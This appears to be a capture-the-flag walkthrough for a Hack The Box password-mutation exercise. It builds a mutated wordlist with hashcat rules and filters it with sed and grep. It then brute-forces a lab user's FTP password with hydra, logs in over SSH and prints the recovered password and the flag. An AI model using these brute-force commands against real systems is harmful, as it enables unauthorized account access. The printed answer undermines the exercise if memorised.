# Password Mutations

### Create a mutated wordlist using the files in the ZIP file under "Resources" in the top right corner of this section. Use this wordlist to brute force the password for the user "sam". Once successful, log in with SSH and submit the contents of the flag.txt file as your answer.

**Generating Rule-based Wordlist**

```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

for making this faster, we did some modifications

```bash
#move all passwords shorter than 10 with 
sed '/^.\{1,9\}$/d' mut_password.list > short_mut_password.list
#to delete lines from a file that do not start with the character 'b' or 'B'
grep -vE '^[^bB]' mut_password.list > short_mut_password.list
```

now we brute forcing with hydra

```bash
hydra -l sam -P short_mut_password.list 10.129.202.64 ftp -t 64 
[21][ftp] host: 10.129.202.64   login: sam   password: B@tm@n2022!
ssh sam@10.129.202.64
find / -name flag.txt 2>/dev/null
cat /home/sam/smb/flag.txt
HTB{P455_Mu7ations}
```
